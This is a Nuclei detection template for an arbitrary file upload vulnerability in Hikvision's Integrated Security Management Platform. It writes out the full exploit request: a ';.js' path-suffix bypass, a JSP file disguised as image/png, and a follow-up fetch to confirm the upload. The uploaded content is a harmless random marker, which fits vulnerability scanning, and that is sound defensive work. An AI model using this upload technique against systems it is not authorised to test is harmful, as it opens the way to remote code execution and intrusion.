id: hikvision-clusters-anyfile-upload
info:
  name: Hikvision Clusters Arbitrary File Upload
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload, critical
  description: |
    Hikvision Integrated Security Management Platform clusters arbitrary file upload vulnerability allows uploading and executing arbitrary files.

variables:
  t1: "{{rand_base(4)}}"
  t2: "{{base64(t1)}}"

flow: http(1) && http(2)

http:
  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/clusterMgr/clusters/ssl/file;.js"
    headers:
      Content-Type: "multipart/form-data; boundary=--------------------------984514492333278399715408"
    body: |-
      ----------------------------984514492333278399715408
      Content-Disposition: form-data; name="file"; filename="languages/{{t1}}.jsp"
      Content-Type: image/png

      {{t2}}
      ----------------------------984514492333278399715408
      Content-Disposition: form-data; name="proxyAddress"

      8.8.8.8
      ----------------------------984514492333278399715408--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - '!contains(http_body, "<")'

  - id: validate-upload
    method: GET
    path:
      - "{{BaseURL}}/clusterMgr/languages/{{t1}}.jsp;.js"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - 'http_body == t2'
